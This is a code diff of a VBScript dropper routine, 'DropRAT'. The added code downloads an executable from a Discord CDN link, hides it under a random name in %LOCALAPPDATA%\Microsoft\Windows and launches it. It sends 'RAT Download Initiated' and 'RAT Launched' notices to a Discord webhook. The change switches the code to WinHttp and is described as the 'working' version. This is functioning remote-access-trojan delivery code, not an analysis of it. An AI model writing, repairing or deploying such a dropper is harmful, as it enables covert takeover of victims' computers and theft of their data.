@@ -43,74 +43,57 @@ Loop
 
 window.close()
 
-' --- RAT DROP ---
+' --- RAT DROP (reverted to working WinHttp version, clean UI) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&"
-
+    
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
+    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000)
-    Dim tmpDat : tmpDat = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & fname & ".dat"
-
+    Dim datPath : datPath = tPath & "\" & fname & ".dat"
+    Dim op : op = tPath & "\" & fname & ".exe"
+    
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
 
-    On Error Resume Next
-    If fso.FileExists(tmpDat) Then fso.DeleteFile tmpDat, True
-    On Error Goto 0
+    If fso.FileExists(op) Then fso.DeleteFile op, True
+    If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
 
     Dim status : status = 0
     Dim bodyLen : bodyLen = 0
-    Dim dlOk : dlOk = False
+    Dim ok : ok = False
 
     On Error Resume Next
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.SetOption 6, 0
-    xh.Open "GET", dl, False
-    xh.Send
-    status = xh.Status
-    If status = 200 Then
-        bodyLen = LenB(xh.responseBody)
-        If bodyLen > 100000 Then
-            Dim st : Set st = CreateObject("ADODB.Stream")
-            st.Type = 1
-            st.Open
-            st.Write xh.responseBody
-            st.SaveToFile tmpDat, 2
-            st.Flush
-            st.Close
-            Set st = Nothing
-            dlOk = True
+    Dim xh : Set xh = CreateObject("WinHttp.WinHttpRequest.5.1")
+    If Not xh Is Nothing Then
+        xh.SetTimeouts 5000, 5000, 5000, 30000
+        xh.Open "GET", dl, False
+        xh.Send
+        status = xh.Status
+        If status = 200 Then
+            bodyLen = LenB(xh.ResponseBody)
+            If bodyLen > 100000 Then
+                Dim st : Set st = CreateObject("ADODB.Stream")
+                st.Type = 1
+                st.Open
+                st.Write xh.ResponseBody
+                st.SaveToFile datPath, 2
+                st.Close
+                Set st = Nothing
+                ok = True
+            End If
+        End If
+        Set xh = Nothing
+    End If
+    On Error Goto 0
+
+    If ok And fso.FileExists(datPath) Then
+        If fso.GetFile(datPath).Size > 100000 Then
+            fso.MoveFile datPath, op
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
+            Call RunCmd("""" & op & """")
         End If
     End If
-    Set xh = Nothing
-    On Error Goto 0
-
-    Dim datSize : datSize = 0
-    On Error Resume Next
-    If fso.FileExists(tmpDat) Then datSize = fso.GetFile(tmpDat).Size
-    On Error Goto 0
-
-    If Not dlOk Then Exit Sub
-    If datSize < 100000 Then Exit Sub
-
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
-    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
-    Dim op : op = tPath & "\" & fname & ".exe"
-
-    On Error Resume Next
-    If fso.FileExists(op) Then fso.DeleteFile op, True
-    fso.MoveFile tmpDat, op
-    On Error Goto 0
-
-    Dim mvOk : mvOk = False
-    On Error Resume Next
-    mvOk = fso.FileExists(op)
-    On Error Goto 0
-
-    If Not mvOk Then Exit Sub
-
-    If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
-    Call RunCmd("""" & op & """")
 End Sub
 
 ' --- IP Function ---
